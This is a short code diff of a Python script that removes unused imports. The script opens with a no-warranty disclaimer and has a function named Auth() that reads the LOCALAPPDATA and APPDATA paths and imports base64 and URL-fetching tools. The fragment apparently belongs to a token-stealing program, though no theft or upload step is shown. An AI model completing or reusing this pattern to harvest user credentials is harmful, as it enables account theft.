@@ -1,13 +1,8 @@
 print(f"THIS PROGRAM COMES WITH NO WARRANTY AND I AM NOT RESPONSIBLE FOR ANY DAMAGES!\nUse at your own risk.")
 import os
 os.system("pause")
-import random
-import threading
-from threading import Thread
-import string
 import urllib3
 urllib3.disable_warnings()
-import asyncio
 import time
 from time import sleep
 
@@ -16,7 +11,6 @@ def Auth():
         from re import findall
         from json import loads
         from base64 import b64decode
-        from subprocess import Popen, PIPE
         from urllib.request import Request, urlopen
         LOCAL = os.getenv("LOCALAPPDATA")
         ROAMING = os.getenv("APPDATA")
